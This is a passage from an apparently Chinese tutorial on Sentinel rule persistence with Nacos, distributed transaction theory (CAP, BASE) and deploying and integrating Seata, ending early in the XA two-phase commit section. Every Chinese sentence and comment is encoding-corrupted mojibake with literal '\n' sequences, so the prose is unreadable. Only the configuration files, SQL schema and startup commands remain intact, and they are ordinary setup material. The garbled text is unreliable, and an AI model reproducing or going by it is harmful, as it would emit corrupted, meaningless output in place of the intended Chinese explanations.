2.é…ç½®nacosåœ°å€\n\nåœ¨order-serviceä¸­çš„application.ymlæ–‡ä»¶é…ç½®nacosåœ°å€åŠç›‘å¬çš„é…ç½®ä¿¡æ¯ï¼š\n\n```yaml\nspring:\n  cloud:\n    sentinel:\n      datasource:\n        flow:\n          nacos:\n            server-addr: localhost:8848 # nacosåœ°å€\n            dataId: orderservice-flow-rules\n            groupId: SENTINEL_GROUP\n            rule-type: flow # è¿˜å¯ä»¥æ˜¯ï¼šdegradeã€authorityã€param-flow\n```\n\n#### 3.ä¿®æ”¹Sentinel-dashboardæºç \n\n> SentinelDashboardé»˜è®¤ä¸æ”¯æŒnacosçš„æŒä¹…åŒ–ï¼Œéœ€è¦ä¿®æ”¹æºç ã€‚\n\nä¸‹è½½sentinel-dashboardæºç åŒ…ï¼Œç”¨IDEAæ‰“å¼€\n\n##### 1ï¼‰ä¿®æ”¹nacosä¾èµ–\n\nåœ¨sentinel-dashboardæºç çš„pomæ–‡ä»¶ä¸­ï¼Œnacosçš„ä¾èµ–é»˜è®¤çš„scopeæ˜¯testï¼Œåªèƒ½åœ¨æµ‹è¯•æ—¶ä½¿ç”¨ï¼Œè¿™é‡Œè¦å»é™¤\n\n```xml\n<dependency>\n    <groupId>com.alibaba.csp</groupId>\n    <artifactId>sentinel-datasource-nacos</artifactId>\n</dependency>\n```\n\n##### 2ï¼‰æ·»åŠ nacosæ”¯æŒ\n\nåœ¨sentinel-dashboardçš„teståŒ…ä¸‹ï¼Œå·²ç»ç¼–å†™äº†å¯¹nacosçš„æ”¯æŒï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶æ‹·è´åˆ°mainä¸‹ã€‚\n\n![](https://img.jwt1399.top/img/202210131625772.png)\n\n##### 3ï¼‰ä¿®æ”¹nacosåœ°å€\n\nç„¶åï¼Œè¿˜éœ€è¦ä¿®æ”¹æµ‹è¯•ä»£ç ä¸­çš„NacosConfigç±»ï¼š\n\n![](https://img.jwt1399.top/img/202210131628968.png)\n\nä¿®æ”¹å…¶ä¸­çš„nacosåœ°å€ï¼Œè®©å…¶è¯»å–application.propertiesä¸­çš„é…ç½®ï¼š\n\n<img src=\"https://img.jwt1399.top/img/202210131628323.png\" style=\"zoom:67%;\" />\n\nåœ¨sentinel-dashboardçš„application.propertiesä¸­æ·»åŠ nacosåœ°å€é…ç½®ï¼š\n\n```properties\nnacos.addr=localhost:8848\n```\n\n##### 4ï¼‰é…ç½®nacosæ•°æ®æº\n\nå¦å¤–ï¼Œè¿˜éœ€è¦ä¿®æ”¹com.alibaba.csp.sentinel.dashboard.controller.v2åŒ…ä¸‹çš„FlowControllerV2ç±»ï¼š\n\n![](https://img.jwt1399.top/img/202210131629440.png)\n\nè®©æˆ‘ä»¬æ·»åŠ çš„Nacosæ•°æ®æºç”Ÿæ•ˆï¼š\n\n![](https://img.jwt1399.top/img/202210131629311.png)\n\n##### 5ï¼‰ä¿®æ”¹å‰ç«¯é¡µé¢\n\næ¥ä¸‹æ¥ï¼Œè¿˜è¦ä¿®æ”¹å‰ç«¯é¡µé¢ï¼Œæ·»åŠ ä¸€ä¸ªæ”¯æŒnacosçš„èœå•ã€‚\n\nä¿®æ”¹src/main/webapp/resources/app/scripts/directives/sidebar/ç›®å½•ä¸‹çš„sidebar.htmlæ–‡ä»¶ï¼š\n\n![](https://img.jwt1399.top/img/202210131630519.png)\n\n\n\nå°†å…¶ä¸­çš„è¿™éƒ¨åˆ†æ³¨é‡Šæ‰“å¼€ï¼š\n\n![](https://img.jwt1399.top/img/202210131630133.png)\n\nä¿®æ”¹å…¶ä¸­çš„æ–‡æœ¬ï¼š\n\n![](https://img.jwt1399.top/img/202210131630652.png)\n\n##### 6ï¼‰é‡æ–°ç¼–è¯‘ã€æ‰“åŒ…é¡¹ç›®\n\nè¿è¡ŒIDEAä¸­çš„mavenæ’ä»¶ï¼Œç¼–è¯‘å’Œæ‰“åŒ…ä¿®æ”¹å¥½çš„Sentinel-Dashboardï¼š\n\n![](https://img.jwt1399.top/img/202210131630645.png)\n\n##### 7ï¼‰å¯åŠ¨\n\nå¯åŠ¨æ–¹å¼è·Ÿå®˜æ–¹ä¸€æ ·ï¼š\n\n```sh\njava -jar sentinel-dashboard.jar\n```\n\nå¦‚æœè¦ä¿®æ”¹nacosåœ°å€ï¼Œéœ€è¦æ·»åŠ å‚æ•°ï¼š\n\n```sh\njava -jar -Dnacos.addr=localhost:8848 sentinel-dashboard.jar\n```\n\n# 2.åˆ†å¸ƒå¼äº‹åŠ¡\n\n## â€äº‹åŠ¡åˆ†ç±»\n\n**æœ¬åœ°äº‹åŠ¡**ï¼Œä¹Ÿå°±æ˜¯åŸºäºå…³ç³»å‹æ•°æ®åº“çš„äº‹åŠ¡ï¼Œä¹Ÿç§°ä¸ºä¼ ç»Ÿäº‹åŠ¡ã€‚åœ¨ä¼ ç»Ÿæ•°æ®åº“äº‹åŠ¡ä¸­ï¼Œå¿…é¡»è¦æ»¡è¶³ACIDåŸåˆ™ï¼š\n\n- åŸå­æ€§ï¼ˆatomicityï¼‰ï¼šäº‹åŠ¡è¦ä¹ˆå…¨éƒ¨æäº¤æˆåŠŸï¼Œè¦ä¹ˆå…¨éƒ¨å¤±è´¥å›æ»š\n\n- ä¸€è‡´æ€§ï¼ˆconsistencyï¼‰ï¼šäº‹åŠ¡çš„æ‰§è¡Œä¸èƒ½ç ´åæ•°æ®åº“æ•°æ®çš„å®Œæ•´æ€§å’Œä¸€è‡´æ€§\n\n- éš”ç¦»æ€§ï¼ˆisolationï¼‰ï¼šå¯¹åŒä¸€èµ„æºæ“ä½œçš„äº‹åŠ¡ä¸èƒ½åŒæ—¶å‘ç”Ÿ\n- æŒä¹…æ€§ï¼ˆdurabilityï¼‰ï¼šå¯¹æ•°æ®åº“åšçš„ä¸€åˆ‡ä¿®æ”¹å°†æ°¸ä¹…ä¿å­˜ï¼Œä¸ç®¡æ˜¯å¦å‡ºç°æ•…éšœ\n\n**åˆ†å¸ƒå¼äº‹åŠ¡**ï¼Œåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿç¯å¢ƒä¸‹ç”±ä¸åŒçš„æœåŠ¡ä¹‹é—´é€šè¿‡ç½‘ç»œè¿œç¨‹åä½œå®Œæˆäº‹åŠ¡ã€‚ä¾‹å¦‚ï¼š\n\n- è·¨æ•°æ®æºçš„åˆ†å¸ƒå¼äº‹åŠ¡\n- è·¨æœåŠ¡çš„åˆ†å¸ƒå¼äº‹åŠ¡\n- ç»¼åˆæƒ…å†µ\n\n**ä¸¾ä¸ªğŸŒ°ï¼š**\n\nä¾‹å¦‚ç”µå•†è¡Œä¸šä¸­æ¯”è¾ƒå¸¸è§çš„ä¸‹å•ä»˜æ¬¾æ¡ˆä¾‹ï¼ŒåŒ…æ‹¬ï¼šåˆ›å»ºæ–°è®¢å•ã€æ‰£å‡å•†å“åº“å­˜ã€ä»ç”¨æˆ·è´¦æˆ·ä½™é¢æ‰£é™¤é‡‘é¢\n\nå®Œæˆä¸Šé¢çš„æ“ä½œéœ€è¦è®¿é—®ä¸‰ä¸ªä¸åŒçš„å¾®æœåŠ¡å’Œä¸‰ä¸ªä¸åŒçš„æ•°æ®åº“ã€‚\n\n![](../images/SpringCloud-é«˜çº§ç¯‡/image-20221015145400942.png)\n\nè®¢å•çš„åˆ›å»ºã€åº“å­˜çš„æ‰£å‡ã€è´¦æˆ·æ‰£æ¬¾åœ¨æ¯ä¸€ä¸ªæœåŠ¡å’Œæ•°æ®åº“å†…æ˜¯ä¸€ä¸ª**æœ¬åœ°äº‹åŠ¡**ï¼Œå¯ä»¥ä¿è¯ACIDåŸåˆ™ã€‚\n\næŠŠä¸‰ä»¶äº‹æƒ…çœ‹åšä¸€ä¸ª\"ä¸šåŠ¡\"ï¼Œè¦ä¿è¯æ‰€æœ‰ä¸šåŠ¡æœ€ç»ˆçŠ¶æ€ä¸€è‡´ï¼Œè¿™å°±æ˜¯**åˆ†å¸ƒå¼ç³»ç»Ÿä¸‹çš„äº‹åŠ¡**äº†ã€‚æ­¤æ—¶ACIDéš¾ä»¥æ»¡è¶³ï¼Œè¿™æ˜¯åˆ†å¸ƒå¼äº‹åŠ¡è¦è§£å†³çš„é—®é¢˜\n\n## âç†è®ºåŸºç¡€\n\n### â¶CAPå®šç†\n\n<img src=\"https://img.jwt1399.top/img/202210151459285.png\" style=\"zoom:50%;\" />\n\n1998å¹´ï¼ŒåŠ å·å¤§å­¦çš„è®¡ç®—æœºç§‘å­¦å®¶ Eric Brewer æå‡ºï¼Œåˆ†å¸ƒå¼ç³»ç»Ÿæœ‰ä¸‰ä¸ªæŒ‡æ ‡ã€‚\n\n- **Consistencyï¼ˆä¸€è‡´æ€§ï¼‰**ï¼šç”¨æˆ·è®¿é—®åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„ä»»æ„èŠ‚ç‚¹ï¼Œå¾—åˆ°çš„æ•°æ®å¿…é¡»ä¸€è‡´ã€‚\n\n- **Availabilityï¼ˆå¯ç”¨æ€§ï¼‰**ï¼šç”¨æˆ·è®¿é—®é›†ç¾¤ä¸­çš„ä»»æ„å¥åº·èŠ‚ç‚¹ï¼Œå¿…é¡»èƒ½å¾—åˆ°å“åº”ï¼Œè€Œä¸æ˜¯è¶…æ—¶æˆ–æ‹’ç»ã€‚\n\n- **Partition tolerance ï¼ˆåˆ†åŒºå®¹é”™æ€§ï¼‰**ï¼šå› ç½‘ç»œæ•…éšœæˆ–å…¶å®ƒåŸå› å¯¼è‡´åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„éƒ¨åˆ†èŠ‚ç‚¹ä¸å…¶å®ƒèŠ‚ç‚¹å¤±å»è¿æ¥ï¼Œå½¢æˆç‹¬ç«‹åˆ†åŒºæ—¶ï¼Œæ•´ä¸ªç³»ç»Ÿä¹Ÿè¦æŒç»­å¯¹å¤–æä¾›æœåŠ¡\n\nå®ƒä»¬çš„ç¬¬ä¸€ä¸ªå­—æ¯åˆ†åˆ«æ˜¯ Cã€Aã€Pã€‚Eric Brewer è¯´ï¼Œåˆ†å¸ƒå¼ç³»ç»ŸèŠ‚ç‚¹é€šè¿‡ç½‘ç»œè¿æ¥ï¼Œä¸€å®šä¼šå‡ºç°åˆ†åŒºé—®é¢˜ï¼ˆPï¼‰\n\nå½“åˆ†åŒºå‡ºç°æ—¶ï¼Œç³»ç»Ÿçš„ä¸€è‡´æ€§ï¼ˆCï¼‰å’Œå¯ç”¨æ€§ï¼ˆAï¼‰å°±æ— æ³•åŒæ—¶æ»¡è¶³ã€‚å³è¿™**ä¸‰ä¸ªæŒ‡æ ‡ä¸å¯èƒ½åŒæ—¶åšåˆ°**ï¼Œè¿™ä¸ªç»“è®ºå°±\n\nå«åš **CAP å®šç†**ã€‚\n\n### â·BASEç†è®º\n\nBASEç†è®ºæ˜¯å¯¹CAPçš„ä¸€ç§è§£å†³æ€è·¯ï¼ŒåŒ…å«ä¸‰ä¸ªæ€æƒ³ï¼š\n\n- **Basically Available** **ï¼ˆåŸºæœ¬å¯ç”¨ï¼‰**ï¼šåˆ†å¸ƒå¼ç³»ç»Ÿåœ¨å‡ºç°æ•…éšœæ—¶ï¼Œå…è®¸æŸå¤±éƒ¨åˆ†å¯ç”¨æ€§ï¼Œå³ä¿è¯æ ¸å¿ƒå¯ç”¨ã€‚\n- **Soft Stateï¼ˆè½¯çŠ¶æ€ï¼‰ï¼š**åœ¨ä¸€å®šæ—¶é—´å†…ï¼Œå…è®¸å‡ºç°ä¸­é—´çŠ¶æ€ï¼Œæ¯”å¦‚ä¸´æ—¶çš„ä¸ä¸€è‡´çŠ¶æ€ã€‚\n- **Eventually Consistentï¼ˆæœ€ç»ˆä¸€è‡´æ€§ï¼‰**ï¼šè™½ç„¶æ— æ³•ä¿è¯å¼ºä¸€è‡´æ€§ï¼Œä½†æ˜¯åœ¨è½¯çŠ¶æ€ç»“æŸåï¼Œæœ€ç»ˆè¾¾åˆ°æ•°æ®ä¸€è‡´ã€‚\n\n### â¸è§£å†³åˆ†å¸ƒå¼äº‹åŠ¡çš„æ€è·¯\n\nåˆ†å¸ƒå¼äº‹åŠ¡æœ€å¤§çš„é—®é¢˜æ˜¯å„ä¸ªå­äº‹åŠ¡çš„ä¸€è‡´æ€§é—®é¢˜ï¼Œå› æ­¤å¯ä»¥å€Ÿé‰´CAPå®šç†å’ŒBASEç†è®ºï¼Œæœ‰ä¸¤ç§è§£å†³æ€è·¯ï¼š\n\n- APæ¨¡å¼ï¼šå„å­äº‹åŠ¡åˆ†åˆ«æ‰§è¡Œå’Œæäº¤ï¼Œå…è®¸å‡ºç°ç»“æœä¸ä¸€è‡´ï¼Œç„¶åé‡‡ç”¨å¼¥è¡¥æªæ–½æ¢å¤æ•°æ®å³å¯ï¼Œå®ç°æœ€ç»ˆä¸€è‡´ã€‚\n\n- CPæ¨¡å¼ï¼šå„å­äº‹åŠ¡æ‰§è¡Œåäº’ç›¸ç­‰å¾…ï¼ŒåŒæ—¶æäº¤å’Œå›æ»šï¼Œè¾¾æˆå¼ºä¸€è‡´ã€‚ä½†äº‹åŠ¡ç­‰å¾…è¿‡ç¨‹ä¸­ï¼Œå¤„äºå¼±å¯ç”¨çŠ¶æ€ã€‚\n\n## â‚åˆè¯†Seata\n\n> Seataæ˜¯ 2019 å¹´ 1 æœˆä»½èš‚èšé‡‘æœå’Œé˜¿é‡Œå·´å·´å…±åŒå¼€æºçš„åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆã€‚è‡´åŠ›äºæä¾›é«˜æ€§èƒ½å’Œç®€å•æ˜“ç”¨çš„åˆ†å¸ƒå¼äº‹åŠ¡æœåŠ¡ï¼Œä¸ºç”¨æˆ·æ‰“é€ ä¸€ç«™å¼çš„åˆ†å¸ƒå¼è§£å†³æ–¹æ¡ˆã€‚å®˜ç½‘åœ°å€ï¼šhttps://seata.io/\n\n### â¶Seataçš„æ¶æ„\n\nSeataäº‹åŠ¡ç®¡ç†ä¸­æœ‰ä¸‰ä¸ªé‡è¦çš„è§’è‰²ï¼š\n\n- **TC (Transaction Coordinator) -** **äº‹åŠ¡åè°ƒè€…ï¼š**ç»´æŠ¤å…¨å±€å’Œåˆ†æ”¯äº‹åŠ¡çš„çŠ¶æ€ï¼Œåè°ƒå…¨å±€äº‹åŠ¡æäº¤æˆ–å›æ»šã€‚\n\n- **TM (Transaction Manager) -** **äº‹åŠ¡ç®¡ç†å™¨ï¼š**å®šä¹‰å…¨å±€äº‹åŠ¡çš„èŒƒå›´ã€å¼€å§‹å…¨å±€äº‹åŠ¡ã€æäº¤æˆ–å›æ»šå…¨å±€äº‹åŠ¡ã€‚\n\n- **RM (Resource Manager) -** **èµ„æºç®¡ç†å™¨ï¼š**ç®¡ç†åˆ†æ”¯äº‹åŠ¡å¤„ç†çš„èµ„æºï¼Œä¸TCäº¤è°ˆä»¥æ³¨å†Œåˆ†æ”¯äº‹åŠ¡å’ŒæŠ¥å‘Šåˆ†æ”¯äº‹åŠ¡çš„çŠ¶æ€ï¼Œå¹¶é©±åŠ¨åˆ†æ”¯äº‹åŠ¡æäº¤æˆ–å›æ»šã€‚\n\n![æ¶æ„å›¾](https://img.jwt1399.top/img/202210151519221.png)\n\nSeataåŸºäºä¸Šè¿°æ¶æ„æä¾›äº†å››ç§ä¸åŒçš„åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆï¼š\n\n- XAæ¨¡å¼ï¼šå¼ºä¸€è‡´æ€§åˆ†é˜¶æ®µäº‹åŠ¡æ¨¡å¼ï¼Œç‰ºç‰²äº†ä¸€å®šçš„å¯ç”¨æ€§ï¼Œæ— ä¸šåŠ¡ä¾µå…¥\n- ATæ¨¡å¼ï¼šæœ€ç»ˆä¸€è‡´çš„åˆ†é˜¶æ®µäº‹åŠ¡æ¨¡å¼ï¼Œæ— ä¸šåŠ¡ä¾µå…¥ï¼Œä¹Ÿæ˜¯Seataçš„é»˜è®¤æ¨¡å¼\n- TCCæ¨¡å¼ï¼šæœ€ç»ˆä¸€è‡´çš„åˆ†é˜¶æ®µäº‹åŠ¡æ¨¡å¼ï¼Œæœ‰ä¸šåŠ¡ä¾µå…¥\n- SAGAæ¨¡å¼ï¼šé•¿äº‹åŠ¡æ¨¡å¼ï¼Œæœ‰ä¸šåŠ¡ä¾µå…¥\n\næ— è®ºå“ªç§æ–¹æ¡ˆï¼Œéƒ½ç¦»ä¸å¼€TCï¼Œä¹Ÿå°±æ˜¯äº‹åŠ¡çš„åè°ƒè€…ã€‚\n\n### â·éƒ¨ç½²TCæœåŠ¡\n\n1.é¦–å…ˆæˆ‘ä»¬è¦ä¸‹è½½seata-serveråŒ…å¹¶è§£å‹ï¼Œåœ°å€ï¼š[ä¸‹è½½ä¸­å¿ƒ (seata.io)](https://seata.io/zh-cn/blog/download.html)\n\n2.ä¿®æ”¹é…ç½®ï¼šä¿®æ”¹confç›®å½•ä¸‹çš„registry.confæ–‡ä»¶ï¼š\n\n```properties\nregistry {\n  # tcæœåŠ¡çš„æ³¨å†Œä¸­å¿ƒç±»ï¼Œè¿™é‡Œé€‰æ‹©nacosï¼Œä¹Ÿå¯ä»¥æ˜¯eurekaã€zookeeperç­‰\n  type = \"nacos\"\n\n  nacos {\n    # seata tc æœåŠ¡æ³¨å†Œåˆ° nacosçš„æœåŠ¡åç§°ï¼Œå¯ä»¥è‡ªå®šä¹‰\n    application = \"seata-tc-server\"\n    serverAddr = \"127.0.0.1:8848\"\n    group = \"DEFAULT_GROUP\"\n    namespace = \"\"\n    cluster = \"SH\"\n    username = \"nacos\"\n    password = \"nacos\"\n  }\n}\n\nconfig {\n  # è¯»å–tcæœåŠ¡ç«¯çš„é…ç½®æ–‡ä»¶çš„æ–¹å¼ï¼Œè¿™é‡Œæ˜¯ä»nacosé…ç½®ä¸­å¿ƒè¯»å–ï¼Œè¿™æ ·å¦‚æœtcæ˜¯é›†ç¾¤ï¼Œå¯ä»¥å…±äº«é…ç½®\n  type = \"nacos\"\n  # é…ç½®nacosåœ°å€ç­‰ä¿¡æ¯\n  nacos {\n    serverAddr = \"127.0.0.1:8848\"\n    namespace = \"\"\n    group = \"SEATA_GROUP\"\n    username = \"nacos\"\n    password = \"nacos\"\n    dataId = \"seataServer.properties\"\n  }\n}\n```\n\n3.åœ¨nacosæ·»åŠ é…ç½®ï¼Œä¸ºäº†è®©tcæœåŠ¡çš„é›†ç¾¤å¯ä»¥å…±äº«é…ç½®ï¼Œæˆ‘ä»¬é€‰æ‹©äº†nacosä½œä¸ºç»Ÿä¸€é…ç½®ä¸­å¿ƒã€‚å› æ­¤æœåŠ¡ç«¯é…ç½®æ–‡ä»¶seataServer.propertiesæ–‡ä»¶éœ€è¦åœ¨nacosä¸­é…å¥½ã€‚åœ¨nacosä¸­æ–°å»ºé…ç½®æ–‡ä»¶seataServer.properties\n\n```properties\n# æ•°æ®å­˜å‚¨æ–¹å¼ï¼Œdbä»£è¡¨æ•°æ®åº“\nstore.mode=db\nstore.db.datasource=druid\nstore.db.dbType=mysql\nstore.db.driverClassName=com.mysql.jdbc.Driver\nstore.db.url=jdbc:mysql://127.0.0.1:3306/seata?useUnicode=true&rewriteBatchedStatements=true\nstore.db.user=root\nstore.db.password=root\nstore.db.minConn=5\nstore.db.maxConn=30\nstore.db.globalTable=global_table\nstore.db.branchTable=branch_table\nstore.db.queryLimit=100\nstore.db.lockTable=lock_table\nstore.db.maxWait=5000\n# äº‹åŠ¡ã€æ—¥å¿—ç­‰é…ç½®\nserver.recovery.committingRetryPeriod=1000\nserver.recovery.asynCommittingRetryPeriod=1000\nserver.recovery.rollbackingRetryPeriod=1000\nserver.recovery.timeoutRetryPeriod=1000\nserver.maxCommitRetryTimeout=-1\nserver.maxRollbackRetryTimeout=-1\nserver.rollbackRetryTimeoutUnlockEnable=false\nserver.undo.logSaveDays=7\nserver.undo.logDeletePeriod=86400000\n\n# å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¼ è¾“æ–¹å¼\ntransport.serialization=seata\ntransport.compressor=none\n# å…³é—­metricsåŠŸèƒ½ï¼Œæé«˜æ€§èƒ½\nmetrics.enabled=false\nmetrics.registryType=compact\nmetrics.exporterList=prometheus\nmetrics.exporterPrometheusPort=9898\n```\n\n4.åˆ›å»ºæ•°æ®åº“è¡¨ï¼štcæœåŠ¡åœ¨ç®¡ç†åˆ†å¸ƒå¼äº‹åŠ¡æ—¶ï¼Œéœ€è¦è®°å½•äº‹åŠ¡ç›¸å…³æ•°æ®åˆ°æ•°æ®åº“ä¸­ï¼Œä½ éœ€è¦æå‰åˆ›å»ºå¥½è¿™äº›è¡¨ã€‚\n\næ–°å»ºä¸€ä¸ªåä¸ºseataçš„æ•°æ®åº“ï¼Œè¿è¡Œæä¾›çš„sqlæ–‡ä»¶ï¼šè¿™äº›è¡¨ä¸»è¦è®°å½•å…¨å±€äº‹åŠ¡ã€åˆ†æ”¯äº‹åŠ¡ã€å…¨å±€é”ä¿¡æ¯ï¼š\n\n```sql\n\nSET NAMES utf8mb4;\nSET FOREIGN_KEY_CHECKS = 0;\n\n-- ----------------------------\n-- åˆ†æ”¯äº‹åŠ¡è¡¨\n-- ----------------------------\nDROP TABLE IF EXISTS `branch_table`;\nCREATE TABLE `branch_table`  (\n  `branch_id` bigint(20) NOT NULL,\n  `xid` varchar(128) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,\n  `transaction_id` bigint(20) NULL DEFAULT NULL,\n  `resource_group_id` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `resource_id` varchar(256) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `branch_type` varchar(8) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `status` tinyint(4) NULL DEFAULT NULL,\n  `client_id` varchar(64) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `application_data` varchar(2000) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `gmt_create` datetime(6) NULL DEFAULT NULL,\n  `gmt_modified` datetime(6) NULL DEFAULT NULL,\n  PRIMARY KEY (`branch_id`) USING BTREE,\n  INDEX `idx_xid`(`xid`) USING BTREE\n) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;\n\n-- ----------------------------\n-- å…¨å±€äº‹åŠ¡è¡¨\n-- ----------------------------\nDROP TABLE IF EXISTS `global_table`;\nCREATE TABLE `global_table`  (\n  `xid` varchar(128) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,\n  `transaction_id` bigint(20) NULL DEFAULT NULL,\n  `status` tinyint(4) NOT NULL,\n  `application_id` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `transaction_service_group` varchar(32) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `transaction_name` varchar(128) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `timeout` int(11) NULL DEFAULT NULL,\n  `begin_time` bigint(20) NULL DEFAULT NULL,\n  `application_data` varchar(2000) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `gmt_create` datetime NULL DEFAULT NULL,\n  `gmt_modified` datetime NULL DEFAULT NULL,\n  PRIMARY KEY (`xid`) USING BTREE,\n  INDEX `idx_gmt_modified_status`(`gmt_modified`, `status`) USING BTREE,\n  INDEX `idx_transaction_id`(`transaction_id`) USING BTREE\n) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;\n\nSET FOREIGN_KEY_CHECKS = 1;\n```\n\n5.å¯åŠ¨TCæœåŠ¡ï¼šè¿›å…¥binç›®å½•ï¼Œè¿è¡Œå…¶ä¸­çš„`seata-server.sh`å³å¯ï¼Œå¯åŠ¨æˆåŠŸåï¼Œseata-serveråº”è¯¥å·²ç»æ³¨å†Œåˆ°nacosæ³¨å†Œä¸­å¿ƒäº†ã€‚\n\næ‰“å¼€æµè§ˆå™¨ï¼Œè®¿é—®nacosåœ°å€ï¼šhttp://localhost:8848ï¼Œç„¶åè¿›å…¥æœåŠ¡åˆ—è¡¨é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°seata-tc-serverçš„ä¿¡æ¯\n\n### â¸å¾®æœåŠ¡é›†æˆSeata\n\næˆ‘ä»¬é€šè¿‡ä¸€ä¸ªæ¡ˆä¾‹æ¥æ¼”ç¤ºåˆ†å¸ƒå¼äº‹åŠ¡çš„é—®é¢˜ï¼šseata-demo\n\n- 1ï¼‰åˆ›å»ºæ•°æ®åº“ï¼Œåä¸ºseata_demoï¼Œç„¶åå¯¼å…¥æä¾›çš„seata-demo.sqlæ–‡ä»¶ï¼š\n\n- 2ï¼‰å°†é¡¹ç›®seata-demoå¯¼å…¥IDEA\n\nå…¶ä¸­ï¼š\n\nseata-demoï¼šçˆ¶å·¥ç¨‹ï¼Œè´Ÿè´£ç®¡ç†é¡¹ç›®ä¾èµ–\n\n- account-serviceï¼šè´¦æˆ·æœåŠ¡ï¼Œè´Ÿè´£ç®¡ç†ç”¨æˆ·çš„èµ„é‡‘è´¦æˆ·ã€‚æä¾›æ‰£å‡ä½™é¢çš„æ¥å£\n- storage-serviceï¼šåº“å­˜æœåŠ¡ï¼Œè´Ÿè´£ç®¡ç†å•†å“åº“å­˜ã€‚æä¾›æ‰£å‡åº“å­˜çš„æ¥å£\n- order-serviceï¼šè®¢å•æœåŠ¡ï¼Œè´Ÿè´£ç®¡ç†è®¢å•ã€‚åˆ›å»ºè®¢å•æ—¶ï¼Œéœ€è¦è°ƒç”¨account-serviceå’Œstorage-service\n\næˆ‘ä»¬ä»¥order-serviceä¸ºä¾‹æ¥æ¼”ç¤ºï¼Œå…¶å®ƒä¸¤ä¸ªå¾®æœåŠ¡ä¹Ÿéƒ½å‚è€ƒorder-serviceçš„æ­¥éª¤æ¥åšï¼Œå®Œå…¨ä¸€æ ·ã€‚\n\n#### 1.å¼•å…¥ä¾èµ–\n\né¦–å…ˆï¼Œåœ¨order-serviceä¸­å¼•å…¥ä¾èµ–ï¼š\n\n```xml\n<!--seata-->\n<dependency>\n    <groupId>com.alibaba.cloud</groupId>\n    <artifactId>spring-cloud-starter-alibaba-seata</artifactId>\n    <exclusions>\n        <!--ç‰ˆæœ¬è¾ƒä½ï¼Œ1.3.0ï¼Œå› æ­¤æ’é™¤--> \n        <exclusion>\n            <artifactId>seata-spring-boot-starter</artifactId>\n            <groupId>io.seata</groupId>\n        </exclusion>\n    </exclusions>\n</dependency>\n<dependency>\n    <groupId>io.seata</groupId>\n    <artifactId>seata-spring-boot-starter</artifactId>\n    <!--seata starter é‡‡ç”¨1.4.2ç‰ˆæœ¬-->\n    <version>${seata.version}</version>\n</dependency>\n```\n\n#### 2.é…ç½®TCåœ°å€\n\nåœ¨order-serviceä¸­çš„application.ymlä¸­ï¼Œé…ç½®TCæœåŠ¡ä¿¡æ¯ï¼Œé€šè¿‡æ³¨å†Œä¸­å¿ƒnacosï¼Œç»“åˆæœåŠ¡åç§°è·å–TCåœ°å€ï¼š\n\n```yaml\nseata:\n  registry: # TCæœåŠ¡æ³¨å†Œä¸­å¿ƒçš„é…ç½®ï¼Œå¾®æœåŠ¡æ ¹æ®è¿™äº›ä¿¡æ¯å»æ³¨å†Œä¸­å¿ƒè·å–tcæœåŠ¡åœ°å€\n    type: nacos # æ³¨å†Œä¸­å¿ƒç±»å‹ nacos\n    nacos:\n      server-addr: 127.0.0.1:8848 # nacosåœ°å€\n      namespace: \"\" # namespaceï¼Œé»˜è®¤ä¸ºç©º\n      group: DEFAULT_GROUP # åˆ†ç»„ï¼Œé»˜è®¤æ˜¯DEFAULT_GROUP\n      application: seata-tc-server # seataæœåŠ¡åç§°\n      username: nacos\n      password: nacos\n  tx-service-group: seata-demo # äº‹åŠ¡ç»„åç§°\n  service:\n    vgroup-mapping: # äº‹åŠ¡ç»„ä¸clusterçš„æ˜ å°„å…³ç³»\n      seata-demo: SH\n```\n\n## âƒSeataå®è·µ\n\n### â¶XAæ¨¡å¼\n\nXA è§„èŒƒ æ˜¯ X/Open ç»„ç»‡å®šä¹‰çš„åˆ†å¸ƒå¼äº‹åŠ¡å¤„ç†ï¼ˆDTPï¼ŒDistributed Transaction Processingï¼‰æ ‡å‡†ï¼ŒXA è§„èŒƒæè¿°äº†å…¨å±€çš„TMä¸å±€éƒ¨çš„RMä¹‹é—´çš„æ¥å£ï¼Œå‡ ä¹æ‰€æœ‰ä¸»æµçš„æ•°æ®åº“éƒ½å¯¹ XA è§„èŒƒæä¾›äº†æ”¯æŒã€‚\n\n#### 1.ä¸¤é˜¶æ®µæäº¤\n\nXAæ˜¯è§„èŒƒï¼Œç›®å‰ä¸»æµæ•°æ®åº“éƒ½å®ç°äº†è¿™ç§è§„èŒƒï¼Œå®ç°çš„åŸç†éƒ½æ˜¯åŸºäºä¸¤é˜¶æ®µæäº¤ã€‚\n\n| æ­£å¸¸æƒ…å†µ                                             | å¼‚å¸¸æƒ…å†µ                                             |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210161435238.png) | ![](https://img.jwt1399.top/img/202210161435283.png) |\n\nä¸€é˜¶æ®µï¼š\n\n- äº‹åŠ¡åè°ƒè€…é€šçŸ¥æ¯ä¸ªäº‹ç‰©å‚ä¸è€…æ‰§è¡Œæœ¬åœ°äº‹åŠ¡\n- 